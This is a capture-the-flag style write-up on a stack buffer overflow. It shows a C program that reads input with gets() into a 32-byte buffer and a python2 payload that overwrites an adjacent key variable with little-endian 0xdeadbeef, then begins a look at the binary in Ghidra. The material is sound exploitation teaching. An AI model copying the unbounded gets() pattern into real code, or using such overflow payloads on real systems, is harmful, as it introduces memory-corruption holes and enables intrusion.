# 🫁 02-overwriting\_stack\_variables\_part2

So let's run the binary and try to test out the overflow

<figure><img src="../../../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

let's unhex the output value to understand what happended

<figure><img src="../../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

let's look at the source code to see what happened

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void do_input(){
    int key = 0x12345678;
    char buffer[32];
    printf("yes? ");
    fflush(stdout);
    gets(buffer);
    if(key == 0xdeadbeef){
        printf("good job!!\n");
        printf("%04x\n", key);
        fflush(stdout);
    }
    else{
        printf("%04x\n", key);
        printf("...\n");
        fflush(stdout);
    }
}

int main(int argc, char* argv[]){
    do_input();
    return 0;
}
```

we see that we have a 32 size buffer and the key value needs to be equal to 0xdeadbeef but there's no input way of changing this value except of overwriting this

<figure><img src="../../../../.gitbook/assets/image (1201).png" alt=""><figcaption></figcaption></figure>

```
python2 -c 'print 32 * "A" + "deadbeef"'
```

So i tried overflowing the 32 size buffer with the value deadbeef but it only took the first 4 chars and reversed them

so we do the same thing but reverse the 2 dead to daed ->

<figure><img src="../../../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

ok now is going to be the tricky part, we are going to craft our payload and inject it in overwrite:

```
python2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"'
python2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"' > payload
./overwrite < payload
```

<figure><img src="../../../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

**`"\xef\xbe\xad\xde"`**:

* This is a string containing four specific byte values, represented in hexadecimal notation. Each `\xHH` sequence represents a single byte, where `HH` is the hexadecimal value of the byte.
* In this case, `"\xef\xbe\xad\xde"` represents the bytes with hexadecimal values `EF`, `BE`, `AD`, and `DE`.

The last four characters are non-printable and represent the bytes `EF`, `BE`, `AD`, and `DE`.

and since the string is reversed it overflows with deadbeef and validates the challenge

Now let's open up ghidra&#x20;

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We can start by changing some of the values to look more like what we had in our C program:

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
